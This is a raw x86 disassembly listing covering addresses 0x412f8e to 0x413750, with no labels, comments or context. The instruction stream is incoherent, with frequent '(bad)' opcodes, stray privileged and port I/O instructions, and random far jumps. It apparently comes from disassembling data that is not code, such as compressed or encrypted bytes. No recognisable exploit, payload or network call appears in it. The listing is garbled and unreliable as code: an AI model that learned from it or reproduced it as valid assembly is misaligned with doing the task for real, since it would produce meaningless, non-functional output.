  412f8e:	adc    al,BYTE PTR [ecx+ebp*2]
  412f91:	loope  0x412f56
  412f93:	shr    DWORD PTR [esi],0x33
  412f96:	iret   
  412f97:	mov    ch,0xb9
  412f99:	and    al,BYTE PTR [eax]
  412f9b:	sbb    al,0x67
  412f9d:	mov    esp,0x24e1affd
  412fa2:	jns    0x412f67
  412fa4:	inc    ebx
  412fa5:	mov    dl,0xc
  412fa7:	and    al,0x6b
  412fa9:	mov    eax,0x41967cdc
  412fae:	retf   
  412faf:	push   ebp
  412fb0:	ins    DWORD PTR es:[edi],dx
  412fb1:	push   ebp
  412fb2:	test   DWORD PTR [ecx-0x675677cc],ebp
  412fb8:	repnz mov al,ds:0x4637160e
  412fbe:	push   0x2
  412fc0:	jno    0x412faa
  412fc2:	adc    eax,0x7e167085
  412fc8:	test   al,0xa0
  412fca:	fcomi  st,st(5)
  412fcc:	adc    eax,0x42dd0caf
  412fd1:	js     0x412fce
  412fd3:	or     ch,BYTE PTR [ebp-0x5e]
  412fd6:	popa   
  412fd7:	xor    DWORD PTR [esp+eiz*4+0x2],ecx
  412fdb:	(bad)  
  412fdc:	mov    ch,0xa4
  412fde:	loopne 0x413022
  412fe0:	test   DWORD PTR [esi],edx
  412fe2:	xchg   DWORD PTR [ecx],ecx
  412fe4:	xchg   edi,eax
  412fe5:	or     eax,0x2c29ea40
  412fea:	loope  0x413069
  412fec:	into   
  412fed:	mov    cl,0xac
  412fef:	pushf  
  412ff0:	xchg   ebx,eax
  412ff1:	iret   
  412ff2:	mov    al,0x11
  412ff4:	cmp    DWORD PTR [edx-0x276ac7aa],0xffffffc0
  412ffb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ffc:	sbb    eax,0xe451ea0c
  413001:	iret   
  413002:	mov    ch,0xc8
  413004:	mov    esp,0x707783d8
  413009:	aas    
  41300a:	dec    esi
  41300b:	add    al,0xb7
  41300d:	sahf   
  41300e:	mov    cs,WORD PTR [esi]
  413010:	inc    esp
  413011:	imul   ecx,DWORD PTR [edi],0xadd1bbaf
  413017:	ror    DWORD PTR [esi+0x43],cl
  41301a:	pop    edi
  41301b:	mov    ah,0x39
  41301d:	mov    al,0x21
  41301f:	xchg   esp,eax
  413020:	in     al,dx
  413021:	sub    al,0xd8
  413024:	bound  eax,QWORD PTR ds:[ebx]
  413027:	pop    es
  413028:	and    ecx,DWORD PTR [eax+0x2aa64427]
  41302e:	sub    eax,0x7f884067
  413033:	sbb    ch,BYTE PTR [eax-0x11c5261d]
  413039:	ror    edi,1
  41303b:	xor    eax,0xd6ca5ceb
  413040:	jl     0x413024
  413042:	push   esi
  413043:	repz mov ebx,0xd3b77ea4
  413049:	loop   0x412ff0
  41304b:	cmp    BYTE PTR [edx+0x6e9f9998],0x49
  413052:	mov    es,WORD PTR [ebp+edi*4-0x40]
  413056:	xchg   ah,dl
  413058:	stc    
  413059:	mov    esp,0x6439221
  41305e:	jb     0x4130c0
  413060:	in     al,dx
  413061:	mov    eax,ecx
  413063:	push   ebp
  413064:	mov    gs,WORD PTR [ebx-0x7ccac1a]
  41306a:	inc    esp
  41306b:	retf   
  41306c:	lods   al,BYTE PTR ds:[esi]
  41306d:	dec    ecx
  41306e:	xchg   esp,eax
  41306f:	retf   0x2e53
  413072:	cli    
  413073:	cmp    bh,0xeb
  413076:	les    esp,FWORD PTR [eax]
  413078:	out    dx,eax
  413079:	push   eax
  41307a:	and    BYTE PTR [edi],dl
  41307c:	jae    0x41300d
  41307e:	imul   esp
  413080:	adc    ah,BYTE PTR [ecx+0x45]
  413083:	push   ds
  413084:	loopne 0x413036
  413086:	retf   
  413087:	fiadd  DWORD PTR [edi-0x5c]
  41308a:	or     bh,BYTE PTR [edi+0x21]
  41308d:	fmul   QWORD PTR [ecx+0x6b]
  413090:	mov    cl,0x3a
  413092:	push   0x29b75e32
  413097:	xchg   BYTE PTR [eax-0x30721a2b],dh
  41309d:	dec    ebx
  41309e:	adc    eax,0x6dbd8880
  4130a3:	or     ebx,0xffffff8d
  4130a6:	cmp    esp,ebp
  4130a8:	xchg   edx,eax
  4130a9:	xor    eax,edi
  4130ab:	jae    0x4130dd
  4130ad:	mov    ah,0x87
  4130af:	adc    edx,DWORD PTR [ebp+ebp*8-0x2e3aef6d]
  4130b6:	popf   
  4130b7:	pop    ss
  4130b8:	(bad)  
  4130b9:	loopne 0x41310b
  4130bb:	or     BYTE PTR [ecx+0x64e61f9b],bh
  4130c1:	push   0x44
  4130c3:	test   DWORD PTR [ebx-0x7ca34133],0x95f718fb
  4130cd:	sbb    eax,0x2c158c9c
  4130d2:	sbb    BYTE PTR [ebx+0xfeec27],0x93
  4130d9:	cmp    al,0x3a
  4130db:	hlt    
  4130dc:	xchg   ebx,eax
  4130dd:	jno    0x41307c
  4130df:	sti    
  4130e0:	xor    al,0xba
  4130e2:	adc    eax,DWORD PTR [ecx+0x1c]
  4130e5:	jbe    0x4130a1
  4130e7:	jecxz  0x4130c8
  4130e9:	sbb    esi,esp
  4130eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4130ec:	mov    ds:0x1548b517,eax
  4130f1:	lods   al,BYTE PTR ds:[esi]
  4130f2:	xor    eax,0xa710de9c
  4130f7:	mov    DWORD PTR [edx-0x76],esp
  4130fa:	cmp    BYTE PTR [esi],al
  4130fc:	push   ss
  4130fd:	mov    esp,0x75be9fda
  413102:	jo     0x413114
  413104:	cwde   
  413105:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413106:	iret   
  413107:	dec    ebx
  413108:	mov    ecx,0xf8dcfdb4
  41310d:	pop    ebx
  41310e:	aam    0x6c
  413110:	jbe    0x41313f
  413112:	arpl   WORD PTR [esi],cx
  413114:	mov    edi,eax
  413116:	pop    edi
  413117:	into   
  413118:	ret    0xe13d
  41311b:	adc    bh,bh
  41311d:	fld    DWORD PTR [eax+0xbd39e6]
  413123:	in     al,dx
  413124:	xchg   esi,eax
  413125:	xchg   DWORD PTR [edi],esp
  413127:	sbb    eax,0xafa67187
  41312c:	imul   eax,DWORD PTR [esi],0xffffff9a
  41312f:	loopne 0x413175
  413131:	into   
  413132:	sbb    dh,BYTE PTR [edi+0x53cd5cc4]
  413138:	mul    DWORD PTR [edi]
  41313a:	imul   edx,ebx,0x77
  41313d:	fild   WORD PTR [esp+esi*2+0x7eacf64a]
  413144:	sub    al,0x37
  413146:	lahf   
  413147:	xchg   ebx,edi
  413149:	mov    bh,BYTE PTR [ecx-0x61049be4]
  41314f:	inc    esi
  413150:	and    esi,esi
  413152:	out    dx,al
  413153:	hlt    
  413154:	mov    bh,0x94
  413156:	pop    eax
  413157:	popf   
  413158:	les    edx,FWORD PTR [esi]
  41315a:	sti    
  41315b:	push   0x739adf1f
  413160:	jp     0x4131b7
  413162:	xchg   DWORD PTR [ebx-0x47],edx
  413165:	or     BYTE PTR [edi],0xae
  413168:	jle    0x41311d
  41316a:	scas   al,BYTE PTR es:[edi]
  41316b:	std    
  41316c:	pop    ds
  41316d:	rdmsr  
  41316f:	fwait
  413170:	leave  
  413171:	and    al,0x7a
  413173:	xor    edi,DWORD PTR [eax]
  413175:	and    BYTE PTR [esi],0x97
  413178:	test   DWORD PTR [eax-0x40],esi
  41317b:	pop    esi
  41317c:	pop    ecx
  41317d:	push   eax
  41317e:	xchg   edi,eax
  41317f:	xchg   esi,eax
  413180:	cmc    
  413181:	sub    edi,DWORD PTR [edi]
  413183:	outs   dx,BYTE PTR ds:[esi]
  413184:	(bad)  
  413185:	jmp    0xe33d:0xecaac5e7
  41318c:	mov    edi,0xbca4a4ce
  413191:	sbb    al,0x2b
  413193:	imul   ebp,edx,0xffffffbb
  413196:	into   
  413197:	ds loop 0x413134
  41319a:	test   DWORD PTR [ecx-0x49f7afde],edx
  4131a0:	or     BYTE PTR [ebx-0x484b8998],0x4a
  4131a7:	in     al,dx
  4131a8:	test   al,0x3a
  4131aa:	scas   eax,DWORD PTR es:[edi]
  4131ab:	addr16 jmp 0x6699fca
  4131b1:	stos   BYTE PTR es:[edi],al
  4131b2:	add    eax,0xf23507bf
  4131b7:	add    DWORD PTR ds:0x6d5ce3c1,0xfa8805c9
  4131c1:	inc    ebp
  4131c2:	ss aaa 
  4131c4:	fwait
  4131c5:	sbb    al,0x65
  4131c7:	xlat   BYTE PTR ds:[ebx]
  4131c8:	dec    edi
  4131c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131ca:	adc    ecx,DWORD PTR [ebx-0x6f9871cf]
  4131d0:	fld    TBYTE PTR [ebx]
  4131d2:	cmp    BYTE PTR ds:0xc01d191c,cl
  4131d8:	mov    dh,0xb
  4131da:	mov    BYTE PTR [ebx],bh
  4131dc:	xchg   ecx,eax
  4131dd:	mov    cl,0xcc
  4131df:	out    dx,al
  4131e0:	int    0xf7
  4131e2:	pop    ebx
  4131e3:	mov    bl,0x4c
  4131e5:	xor    eax,0x10b3e7ce
  4131ea:	sbb    BYTE PTR [si-0x1f],bl
  4131ee:	aas    
  4131ef:	pop    ebp
  4131f0:	mov    esi,0x3d2d1378
  4131f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131f6:	montmul (bad)
  4131f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4131f8:	les    eax,FWORD PTR [ebx+0x3b]
  4131fb:	cmp    ecx,DWORD PTR [ecx+0x58]
  4131fe:	repnz push es
  413200:	cld    
  413201:	test   cl,ch
  413203:	gs xchg edx,eax
  413205:	mov    BYTE PTR [ebp-0x12],cl
  413208:	ficom  WORD PTR [edi-0x5a]
  41320b:	or     bh,BYTE PTR [ebx]
  41320d:	jecxz  0x413192
  41320f:	mov    DWORD PTR [esi-0x1d7bdde6],ecx
  413215:	xor    edx,esi
  413217:	mov    esp,0xbfd10c9a
  41321c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41321d:	pop    ebx
  41321e:	or     eax,0x31ef93b8
  413223:	clc    
  413224:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413225:	fimul  DWORD PTR [edx+0x10]
  413228:	repnz jecxz 0x4132a8
  41322b:	adc    al,0xa8
  41322d:	mov    edi,DWORD PTR [eax-0x7a]
  413230:	iret   
  413231:	lds    esi,FWORD PTR [ecx+0x1e8c6227]
  413237:	xor    BYTE PTR [ecx+0x3d],dl
  41323a:	jbe    0x4131c5
  41323c:	xchg   esp,eax
  41323d:	sbb    eax,0xe9918914
  413242:	sahf   
  413243:	mov    dl,0xe3
  413245:	adc    ebp,DWORD PTR [edx-0x5c]
  413248:	int    0xd5
  41324a:	leave  
  41324b:	jno    0x4131d3
  41324d:	dec    eax
  41324e:	jnp    0x413217
  413250:	ja     0x41324d
  413252:	(bad)  [edx]
  413254:	jns    0x413289
  413256:	retf   0x2524
  413259:	sbb    ecx,DWORD PTR [ebp-0x2bd3467b]
  41325f:	inc    esp
  413260:	sar    edi,cl
  413262:	enter  0x70dc,0x28
  413266:	sbb    DWORD PTR [esi+0x7b],edi
  413269:	jge    0x41326a
  41326b:	xchg   esi,eax
  41326c:	sti    
  41326d:	ret    0x7000
  413270:	je     0x413226
  413272:	xchg   edx,eax
  413273:	mov    ebx,0xeed82382
  413278:	mov    esp,0xd2e3095
  41327d:	jno    0x41323f
  41327f:	test   al,0xcb
  413281:	aam    0xed
  413283:	xchg   esi,eax
  413284:	repnz cmp eax,0x896cdbeb
  41328a:	push   es
  41328b:	adc    al,0x14
  41328d:	and    BYTE PTR [ebp-0x44],bl
  413290:	out    dx,al
  413291:	ins    BYTE PTR es:[edi],dx
  413292:	push   ebx
  413293:	or     al,0x5
  413295:	(bad)  
  413296:	rol    BYTE PTR [ecx],cl
  413298:	xor    esi,ecx
  41329a:	js     0x4132ef
  41329c:	dec    edi
  41329d:	call   FWORD PTR [eax+edx*1-0x22318252]
  4132a4:	(bad)  
  4132a5:	pop    esi
  4132a6:	jg     0x41324c
  4132a8:	push   0x11
  4132aa:	or     edi,DWORD PTR [edx]
  4132ac:	inc    edx
  4132ad:	push   ecx
  4132ae:	lock xor al,0x32
  4132b1:	loope  0x4132bd
  4132b3:	fadd   QWORD PTR [ecx]
  4132b5:	mov    ch,BYTE PTR [ecx+esi*2]
  4132b8:	pushf  
  4132b9:	repz mov ebp,0x2b0f0e5c
  4132bf:	mov    gs,ebp
  4132c1:	pop    esp
  4132c2:	(bad)  
  4132c3:	mul    BYTE PTR [eax+0x7e]
  4132c6:	dec    ebp
  4132c7:	sahf   
  4132c8:	fimul  WORD PTR [eax]
  4132ca:	xor    eax,0x5bc34787
  4132cf:	xchg   DWORD PTR [ebx-0x31],ebx
  4132d2:	xor    DWORD PTR [esi+0x79515402],esi
  4132d8:	sbb    BYTE PTR [edi+0x4b],0x77
  4132dc:	jne    0x4132fc
  4132de:	mov    ss,WORD PTR [eax]
  4132e0:	jbe    0x4132bc
  4132e2:	loope  0x4132d8
  4132e4:	add    ebp,DWORD PTR [ecx-0x43c0170d]
  4132ea:	or     DWORD PTR [ebx+0x10],0x4f0230a2
  4132f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132f2:	ret    0xa1e7
  4132f5:	add    al,BYTE PTR [eax]
  4132f7:	or     BYTE PTR [esi-0x25],bl
  4132fa:	inc    edi
  4132fb:	pop    ds
  4132fc:	jle    0x41333b
  4132fe:	inc    ebx
  4132ff:	inc    edi
  413300:	inc    eax
  413301:	add    al,0xeb
  413303:	and    DWORD PTR [ebp-0x2a],eax
  413306:	lds    ebp,FWORD PTR [esi+0x19a4bb31]
  41330c:	or     al,0xc4
  41330e:	std    
  41330f:	mov    bl,0x8b
  413312:	push   ds
  413313:	lods   al,BYTE PTR ds:[esi]
  413314:	pop    edx
  413315:	test   ch,bh
  413317:	jne    0x413366
  413319:	fld    DWORD PTR [esi+0x73]
  41331c:	adc    DWORD PTR [edi-0x4fa9dab],esi
  413322:	es inc ecx
  413324:	js     0x413396
  413326:	dec    ebx
  413327:	xchg   esp,eax
  413328:	add    ecx,esi
  41332a:	mov    ebp,0x16a31911
  41332f:	shl    BYTE PTR [edx],0xe4
  413332:	dec    edx
  413333:	pop    esi
  413334:	dec    edx
  413335:	fcmovnbe st,st(3)
  413337:	nop
  413338:	sub    dl,BYTE PTR [eax+0x19]
  41333b:	(bad)  
  41333c:	pop    ss
  41333d:	aaa    
  41333e:	xor    al,cl
  413340:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413341:	mov    al,0x6f
  413343:	mov    DWORD PTR [ebx],ebx
  413345:	(bad)  
  413346:	lock mov edx,0xe4addb74
  41334c:	pop    esi
  41334d:	pop    ebx
  41334e:	or     ebp,ebp
  413350:	or     DWORD PTR [esi-0x38],esi
  413353:	(bad)  
  413354:	out    0x31,eax
  413356:	sbb    ecx,DWORD PTR [esi]
  413358:	mov    DWORD PTR [edx+0x61cd86b4],0xc7190b7c
  413362:	push   0xffffff82
  413364:	ror    BYTE PTR [ecx-0x68],cl
  413367:	shl    BYTE PTR [ebp-0x1],cl
  41336a:	in     al,dx
  41336b:	dec    ebp
  41336c:	sub    DWORD PTR [eax-0x576f358f],edi
  413372:	and    al,BYTE PTR [ebx-0x51]
  413375:	jo     0x41331f
  413377:	jecxz  0x41337d
  413379:	pop    eax
  41337a:	push   ebp
  41337b:	mov    ds:0xca029bf1,eax
  413380:	cmp    dh,dh
  413382:	lds    esi,FWORD PTR [esi+0x7a]
  413385:	mov    eax,0x8de89f66
  41338a:	cld    
  41338b:	fucomp st(1)
  41338d:	cli    
  41338e:	cwde   
  41338f:	or     eax,0x89cd0d55
  413394:	add    DWORD PTR [edi+edx*8+0x3b684b21],edi
  41339b:	scas   eax,DWORD PTR es:[edi]
  41339c:	es popa 
  41339e:	sub    eax,0xc4789422
  4133a3:	jle    0x41338e
  4133a5:	mov    ah,0xd8
  4133a7:	mov    ds:0xe4255fe6,eax
  4133ac:	adc    BYTE PTR [ebx-0x6701d473],0x1d
  4133b3:	jmp    0xb8b3:0xa6a68151
  4133ba:	stc    
  4133bb:	cs mov bl,0x52
  4133be:	xor    esi,DWORD PTR [esi-0x2d]
  4133c1:	inc    ebp
  4133c2:	mov    dh,BYTE PTR [esi-0x461d4c45]
  4133c8:	push   edi
  4133c9:	push   ebp
  4133ca:	sub    cl,BYTE PTR [esi]
  4133cc:	scas   al,BYTE PTR es:[edi]
  4133cd:	xchg   ebx,eax
  4133ce:	outs   dx,BYTE PTR ds:[esi]
  4133cf:	xor    eax,0x2d9cdfc
  4133d4:	jae    0x413414
  4133d6:	jge    0x413388
  4133d8:	fld    DWORD PTR [edx+0x15942228]
  4133de:	mov    edx,0x537d1ec0
  4133e3:	in     al,dx
  4133e4:	and    BYTE PTR [edx+esi*2],bh
  4133e7:	push   ds
  4133e8:	sti    
  4133e9:	jno    0x41345f
  4133eb:	dec    esi
  4133ec:	push   ecx
  4133ed:	add    al,0xf8
  4133ef:	jge    0x41343d
  4133f1:	out    0xfd,al
  4133f3:	cmc    
  4133f4:	outs   dx,DWORD PTR ds:[esi]
  4133f5:	mov    edx,0x21a0949a
  4133fa:	je     0x413469
  4133fc:	jge    0x413436
  4133fe:	sti    
  4133ff:	out    dx,eax
  413400:	xchg   ecx,eax
  413401:	jle    0x413465
  413403:	dec    ecx
  413404:	imul   esi,edx,0x6c
  413407:	fucomp st(2)
  413409:	xchg   DWORD PTR [ecx-0x15b6b12c],ebp
  41340f:	cmc    
  413410:	mov    bl,0x44
  413412:	ds scas al,BYTE PTR es:[edi]
  413414:	xchg   ebp,eax
  413415:	repz lea esi,[ebx]
  413418:	push   ebx
  413419:	ret    
  41341a:	push   eax
  41341b:	mov    ecx,0x77586af3
  413420:	xor    bl,BYTE PTR [eax+0x771c2201]
  413426:	mov    ds:0x8d2885a1,eax
  41342b:	push   eax
  41342c:	xchg   BYTE PTR [esi-0x31dbb830],ch
  413432:	jnp    0x4133d1
  413434:	push   esi
  413435:	sbb    BYTE PTR ds:0x71de1ce6,cl
  41343b:	jno    0x413491
  41343d:	cmp    ebp,DWORD PTR [edi+0x1228ba1b]
  413443:	xchg   ecx,eax
  413444:	mov    BYTE PTR [edi-0x66],cl
  413447:	dec    eax
  413448:	or     edi,DWORD PTR [edi-0x7ab76298]
  41344e:	mov    edi,eax
  413450:	add    eax,0x1c87af72
  413455:	in     al,dx
  413456:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413457:	test   eax,0x3e77fba
  41345c:	jmp    0x5291d2f3
  413461:	fsub   DWORD PTR [edi-0x53b3a520]
  413467:	pop    ebx
  413468:	fsub   st(1),st
  41346a:	pop    esp
  41346b:	(bad)  
  41346c:	in     al,0x47
  41346e:	clc    
  41346f:	mov    ah,0x40
  413471:	mov    ch,0x2
  413473:	(bad)  
  413474:	mov    cl,0x90
  413476:	xor    esp,esi
  413478:	adc    al,al
  41347a:	mov    ebx,0x2a9ea959
  41347f:	mov    ds:0x1385e10d,al
  413484:	arpl   ax,cx
  413486:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413487:	fsub   QWORD PTR [ebx]
  413489:	cmp    al,0x20
  41348b:	lock jmp 0x4134a2
  41348e:	retf   0x31d1
  413491:	(bad)  
  413492:	into   
  413493:	mov    DWORD PTR [ebx+0x4],esi
  413496:	mov    dl,ah
  413498:	or     BYTE PTR [ebp-0x4ec4c35a],al
  41349e:	dec    esi
  41349f:	adc    DWORD PTR [ebx+0x4fba2eb7],esp
  4134a5:	icebp  
  4134a6:	pop    edi
  4134a7:	es pop esp
  4134a9:	mov    WORD PTR [ebx],es
  4134ab:	mov    ebx,DWORD PTR [eax]
  4134ad:	mov    eax,cs:0xe84c84e3
  4134b3:	xlat   BYTE PTR ds:[ebx]
  4134b4:	sub    cl,0xdd
  4134b7:	jge    0x4134f8
  4134b9:	ficomp WORD PTR [ebp+0x20]
  4134bc:	shl    DWORD PTR [ebp-0x555a28be],1
  4134c2:	(bad)  
  4134c3:	jmp    0x3cd8d3c7
  4134c8:	aad    0xdc
  4134ca:	jne    0x4134bb
  4134cc:	jmp    0xaa2a700
  4134d1:	xchg   ecx,eax
  4134d2:	(bad)  
  4134d3:	mov    ds:0x7f3bc677,eax
  4134d8:	push   0x233a099f
  4134dd:	push   eax
  4134de:	jmp    0xe77f2f87
  4134e3:	(bad)  
  4134e4:	push   ecx
  4134e5:	mov    eax,es
  4134e7:	(bad)  
  4134e8:	loop   0x413567
  4134ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134eb:	mov    eax,ds:0x8c83e929
  4134f0:	pop    esp
  4134f1:	in     eax,dx
  4134f2:	lock pop edi
  4134f4:	retf   
  4134f5:	xor    eax,0xb2cc46f5
  4134fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134fb:	dec    edi
  4134fc:	jnp    0x4134ee
  4134fe:	out    dx,al
  4134ff:	outs   dx,BYTE PTR ds:[esi]
  413500:	dec    esp
  413501:	hlt    
  413502:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413503:	ret    0x515b
  413506:	js     0x413492
  413508:	mov    eax,ds:0xcc8a575b
  41350d:	nop
  41350e:	dec    esi
  41350f:	push   0x4f24775d
  413514:	lods   al,BYTE PTR ds:[esi]
  413515:	(bad)  
  413516:	fldcw  WORD PTR [ecx+eiz*1+0x6c]
  41351a:	cwde   
  41351b:	adc    ebp,DWORD PTR [ebx]
  41351d:	cmp    dl,BYTE PTR [esi+0x7f]
  413520:	in     eax,0xce
  413522:	push   es
  413523:	push   es
  413524:	xchg   edi,eax
  413525:	push   ds
  413526:	stos   BYTE PTR es:[edi],al
  413527:	jle    0x4134db
  413529:	jmp    DWORD PTR [ebp+ebx*4-0x3c]
  41352d:	pusha  
  41352e:	sub    ebx,DWORD PTR [ebx-0x54]
  413531:	addr16 push cs
  413533:	xor    BYTE PTR [edx+ebx*1+0x18],ch
  413537:	push   ebx
  413538:	in     al,dx
  413539:	jmp    0x21f:0xb1dd8422
  413540:	add    DWORD PTR [ecx],edx
  413542:	rol    DWORD PTR [edi+ebx*4],0xd9
  413546:	mov    bh,0x60
  413548:	shl    BYTE PTR [ebx+0x6540d635],0xd7
  41354f:	adc    ecx,eax
  413551:	leave  
  413552:	push   edi
  413553:	inc    edi
  413554:	pushf  
  413555:	pop    ss
  413556:	aad    0x44
  413558:	add    ecx,0x72
  41355b:	out    dx,eax
  41355c:	loop   0x413544
  41355e:	mov    ebp,0xc1084d5d
  413563:	mov    esp,edx
  413565:	test   eax,0xba351223
  41356a:	cmp    ah,BYTE PTR [ebx+0x11fdc9f]
  413570:	push   0x79
  413572:	retf   0x156c
  413575:	sub    dh,BYTE PTR [eax-0x6acde658]
  41357b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41357c:	cmp    BYTE PTR [eax+eax*4-0x61cbbd25],dl
  413583:	pushf  
  413584:	mov    eax,0x7770ad03
  413589:	cmp    BYTE PTR [ebp+0x6c],ah
  41358c:	add    edi,DWORD PTR [edi+0x3ef832a2]
  413592:	ja     0x4135d4
  413594:	add    eax,DWORD PTR [ebp-0x3afe9c87]
  41359a:	jae    0x41358b
  41359c:	adc    al,0xb
  41359e:	fisttp WORD PTR [ebp+0x6ebc7819]
  4135a4:	pop    ecx
  4135a5:	mov    DWORD PTR [edx-0x33],edx
  4135a8:	sbb    eax,0x935eac33
  4135ad:	ret    
  4135ae:	push   eax
  4135af:	cmp    DWORD PTR [ebx+0x21],0xaed5523c
  4135b6:	sub    eax,0xd2563eff
  4135bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135bc:	sub    BYTE PTR [edi],ah
  4135be:	pop    ecx
  4135bf:	pusha  
  4135c0:	bound  edi,QWORD PTR [ebx-0x64]
  4135c3:	jo     0x413593
  4135c5:	rcl    DWORD PTR [ebp+0x7c4e5343],0x7f
  4135cc:	mov    ds:0x7488cba,eax
  4135d1:	lea    esp,[esi-0x716de4ce]
  4135d7:	aas    
  4135d8:	xchg   edx,eax
  4135d9:	ss push 0xfffffffa
  4135dc:	inc    esp
  4135dd:	das    
  4135de:	mov    al,0x1c
  4135e0:	add    eax,0xb88f2004
  4135e5:	int    0x4b
  4135e7:	ins    BYTE PTR es:[edi],dx
  4135e8:	mov    esp,0x2ead0213
  4135ed:	mov    bh,0x7d
  4135ef:	pusha  
  4135f0:	sbb    edx,DWORD PTR [esi-0x22bc1a01]
  4135f6:	xchg   edx,eax
  4135f7:	sti    
  4135f8:	push   edx
  4135f9:	daa    
  4135fa:	data16 adc cl,BYTE PTR [edx+0x73]
  4135fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4135ff:	mul    BYTE PTR gs:[esi+0x3125bc0c]
  413606:	sbb    eax,0xee102dcd
  41360b:	add    al,0x40
  41360d:	pop    ecx
  41360e:	push   0xffffffd8
  413610:	stc    
  413611:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413612:	and    DWORD PTR [ecx+ecx*4],eax
  413615:	jle    0x4135dd
  413617:	jg     0x413688
  413619:	repz push 0xffffffc1
  41361c:	(bad)  
  41361d:	dec    ebp
  41361e:	and    al,0x91
  413620:	pusha  
  413621:	mul    DWORD PTR [eax]
  413623:	xchg   esi,eax
  413624:	faddp  st(6),st
  413626:	inc    ebp
  413627:	loop   0x413643
  413629:	fistp  WORD PTR [ebx]
  41362b:	imul   BYTE PTR [eax]
  41362d:	fcom   st(5)
  41362f:	mov    eax,ds:0x435967bf
  413634:	xchg   ebp,eax
  413635:	div    ebp
  413637:	push   0x7e
  413639:	cmp    BYTE PTR [eax+ebx*2],ch
  41363c:	jecxz  0x413695
  41363e:	ins    BYTE PTR es:[edi],dx
  41363f:	repz fwait
  413641:	popa   
  413642:	inc    eax
  413643:	ss or  al,0x17
  413646:	test   DWORD PTR [edi+0x49],edi
  413649:	cmp    ecx,DWORD PTR [esi]
  41364b:	sbb    DWORD PTR [ebx],edx
  41364d:	nop
  41364e:	xor    ecx,esi
  413650:	cli    
  413651:	fmul   QWORD PTR [edi-0x1ce09a80]
  413657:	out    0xa2,eax
  413659:	mov    ch,0x98
  41365b:	scas   eax,DWORD PTR es:[edi]
  41365c:	and    BYTE PTR [ecx+0x611d074f],0xfd
  413663:	xchg   DWORD PTR [ebx+0x1464998c],ebp
  413669:	je     0x4135f0
  41366b:	cmp    al,BYTE PTR [eax-0x159a6ce8]
  413671:	jbe    0x4136ef
  413673:	xor    eax,0xcba473e3
  413678:	pop    ebp
  413679:	add    eax,0x586f8771
  41367e:	and    BYTE PTR [edi-0x14933705],ch
  413684:	shr    BYTE PTR [edi],1
  413686:	int3   
  413687:	add    DWORD PTR [eax-0xe2b76e1],eax
  41368d:	mov    dl,0x8b
  41368f:	pop    ss
  413690:	test   al,0xd4
  413692:	in     al,0x14
  413694:	xchg   DWORD PTR [esi],edx
  413696:	fsubr  DWORD PTR [edi]
  413698:	(bad)  
  41369a:	ret    
  41369b:	ja     0x413624
  41369d:	xor    ah,BYTE PTR [esi+0x3f]
  4136a0:	into   
  4136a1:	push   ebx
  4136a2:	mov    eax,ds:0xe04a8c65
  4136a7:	cmp    ebp,ebp
  4136a9:	fdivr  st(5),st
  4136ab:	mov    dh,0xe3
  4136ad:	lea    esi,[eax-0x4f]
  4136b0:	dec    ecx
  4136b1:	ins    BYTE PTR es:[edi],dx
  4136b2:	push   esp
  4136b3:	(bad)  
  4136b4:	and    esi,eax
  4136b6:	call   FWORD PTR [ebx-0x73]
  4136b9:	or     dh,ah
  4136bb:	(bad)  
  4136bc:	loop   0x4136ae
  4136be:	ficom  WORD PTR [ecx-0x68]
  4136c1:	fld    QWORD PTR [edx]
  4136c3:	pusha  
  4136c4:	xchg   ebx,eax
  4136c5:	pop    ecx
  4136c6:	lahf   
  4136c7:	jno    0x4136f4
  4136c9:	add    DWORD PTR [edi],0xb3fd7859
  4136cf:	mov    ebp,0x678ab73a
  4136d4:	cs ins BYTE PTR es:[edi],dx
  4136d6:	lock jns 0x413758
  4136d9:	cmp    eax,0xeb5a5f9f
  4136de:	test   al,0x50
  4136e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136e1:	idiv   DWORD PTR [ebx+0x7813e0e3]
  4136e7:	sti    
  4136e8:	push   0xffffff95
  4136ea:	mov    DWORD PTR [ebp-0x762b2476],edx
  4136f0:	sbb    DWORD PTR [ecx+eax*8],edi
  4136f3:	or     eax,0x1f46e443
  4136f8:	test   al,0xf4
  4136fa:	jecxz  0x41370e
  4136fc:	jmp    0xd94d2fa6
  413701:	xor    eax,0x6d7b7536
  413706:	jecxz  0x41374c
  413708:	cdq    
  413709:	mov    ch,0x3a
  41370b:	cmp    DWORD PTR [ecx],ecx
  41370d:	call   DWORD PTR [edi]
  41370f:	push   ebp
  413710:	jbe    0x4136f2
  413712:	shr    DWORD PTR [ebx+0x612fdc4b],0xf5
  413719:	mov    cl,0x3e
  41371b:	std    
  41371c:	dec    eax
  41371d:	test   al,0x77
  41371f:	std    
  413720:	popf   
  413721:	aam    0x89
  413723:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413724:	out    dx,al
  413725:	loop   0x413780
  413727:	cwde   
  413728:	xor    BYTE PTR ds:0x2c0ceeb6,cl
  41372e:	retf   0x6a3f
  413731:	(bad)  [edx+esi*4+0xe]
  413735:	add    dh,al
  413737:	mov    ds:0xc4bd35ce,al
  41373c:	test   BYTE PTR [edi-0x2d],bh
  41373f:	and    al,BYTE PTR [ecx+0x6311ed8]
  413745:	mov    ah,0x8f
  413747:	ror    BYTE PTR [eax+eax*2+0x14],cl
  41374b:	jmp    0x41c77af9
  413750:	fistp  WORD PTR [edi+0x21]
